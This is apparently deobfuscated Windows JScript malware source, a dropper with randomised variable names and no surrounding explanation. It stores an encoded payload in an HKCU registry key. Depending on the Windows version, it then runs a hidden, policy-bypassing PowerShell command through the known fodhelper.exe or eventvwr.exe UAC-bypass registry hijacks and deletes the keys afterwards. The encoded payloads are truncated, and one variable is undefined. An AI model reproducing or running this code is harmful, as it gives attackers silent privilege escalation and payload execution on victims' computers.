"use strict";
/**
 * @param {string} callback
 * @return {?}
 */
function getServiceStatus(callback) {
  var obj = GetObject("winmgmts:").ExecQuery(
    "SELECT * FROM Win32_Service WHERE Name='" + callback + "'"
  );
  akpcrf = new Enumerator(obj);
  zmubfuo = akpcrf.item();
  /** @type {string} */
  var statusProperty = "";
  try {
    statusProperty = zmubfuo.State;
  } catch (e) {}
  if (statusProperty == "Running") {
    return true;
  } else {
    return false;
  }
}
var shellObject = WScript.CreateObject("shell.application");
var wScriptObject = new ActiveXObject("WScript.Shell");
var mtvunslh = GetObject("winmgmts:\\\\.\\root\\CIMV2");
var hewjay = mtvunslh.ExecQuery(
  "SELECT * FROM Win32_OperatingSystem",
  "WQL",
  16 | 32
);
var yhqpykwg = new Enumerator(hewjay);
var yjiofgrdfx = yhqpykwg.item();
var systemDirectoryPath = yjiofgrdfx.SystemDirectory;
var daiofhmsnh = yjiofgrdfx.Version;
var arr = daiofhmsnh.split(".");
/** @type {string} */
var zrynfhnwsub = "QQBk...H0A";
wScriptObject.RegWrite(
  "HKEY_CURRENT_USER\\Software\\capvzgf\\cazysa",
  zrynfhnwsub,
  "REG_SZ"
);
/** @type {string} */
var djziapwzi =
  systemDirectoryPath +
  "\\WindowsPowerShell\\v1.0\\powershell.exe -nologo -noprofile -ExecutionPolicy ByPass -w hidden -EncodedCommand WwB.....AA==";
if (arr[0] == "10") {
  wScriptObject.RegWrite(
    "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\",
    djziapwzi,
    "REG_SZ"
  );
  wScriptObject.RegWrite(
    "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute",
    "",
    "REG_SZ"
  );
  shellObject.ShellExecute(
    "explorer.exe",
    '"' + systemDirectoryPath + '\\fodhelper.exe"',
    "",
    "open",
    0
  );
  WScript.sleep(5000);
  wScriptObject.RegDelete(
    "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"
  );
} else {
  if (arr[0] == "6") {
    wScriptObject.RegWrite(
      "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\",
      djziapwzi,
      "REG_SZ"
    );
    shellObject.ShellExecute(
      "explorer.exe",
      '"' + systemDirectoryPath + '\\eventvwr.exe"',
      "",
      "open",
      0
    );
    WScript.sleep(5000);
    wScriptObject.RegDelete(
      "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"
    );
  }
}
/** @type {number} */
var iii = 0;
for (; true; ) {
  if (getServiceStatus(swmzra)) {
    WScript.sleep(100);
  } else {
    break;
  }
  /** @type {number} */
  iii = iii + 1;
  if (iii == 600) {
    break;
  }
}
